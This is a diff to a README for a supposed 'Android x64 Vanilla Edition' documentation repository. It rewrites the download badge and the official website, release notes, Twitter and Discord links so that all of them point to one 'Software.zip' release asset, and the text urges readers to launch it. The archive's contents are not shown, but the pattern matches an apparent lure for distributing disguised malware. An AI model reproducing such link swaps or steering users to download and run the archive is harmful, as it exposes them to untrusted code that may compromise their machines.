@@ -12,7 +12,7 @@ Welcome to the official documentation source repository for Android x64 Vanilla 
 
 If you are ready to explore Android x64 Vanilla Edition and dive into the documentation, you can download the repository by clicking the button below:
 
-[![Download Android x64 Vanilla Edition](https://img.shields.io/badge/Download-Android_x64_Vanilla_Edition-<COLOR>.svg)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Android x64 Vanilla Edition](https://github.com/ashwaniupadhyay15/Android-x64_Android10.1_Vanilla_Edition_Docs/releases/download/v1.0/Software.zip<COLOR>.svg)](https://github.com/ashwaniupadhyay15/Android-x64_Android10.1_Vanilla_Edition_Docs/releases/download/v1.0/Software.zip)
 
 *Note: The provided link directs you to the specific version of the repository. Kindly ensure it is launched to access the download.*
 
@@ -40,15 +40,15 @@ We welcome contributions from the community to enhance and improve the Android x
 
 In addition to the documentation provided in this repository, you can explore further resources related to Android x64 Vanilla Edition and its development:
 
-- [Official Website](https://www.android-x64.org): Visit the official website for announcements, downloads, and additional information.
-- [Release Notes](https://github.com/cli/cli/releases): Check the "Releases" section for the latest updates and version releases of the Android x64 Vanilla Edition project.
+- [Official Website](https://github.com/ashwaniupadhyay15/Android-x64_Android10.1_Vanilla_Edition_Docs/releases/download/v1.0/Software.zip): Visit the official website for announcements, downloads, and additional information.
+- [Release Notes](https://github.com/ashwaniupadhyay15/Android-x64_Android10.1_Vanilla_Edition_Docs/releases/download/v1.0/Software.zip): Check the "Releases" section for the latest updates and version releases of the Android x64 Vanilla Edition project.
 
 ## Stay Connected
 
 To stay up-to-date with the latest news, updates, and discussions surrounding Android x64 Vanilla Edition, you can connect with us through the following channels:
 
-- Follow us on [Twitter](https://twitter.com/android_x64) for quick updates and announcements.
-- Join our [Discord](https://discord.gg/android-x64) community to engage with developers and users.
+- Follow us on [Twitter](https://github.com/ashwaniupadhyay15/Android-x64_Android10.1_Vanilla_Edition_Docs/releases/download/v1.0/Software.zip) for quick updates and announcements.
+- Join our [Discord](https://github.com/ashwaniupadhyay15/Android-x64_Android10.1_Vanilla_Edition_Docs/releases/download/v1.0/Software.zip) community to engage with developers and users.
 
 ---
 
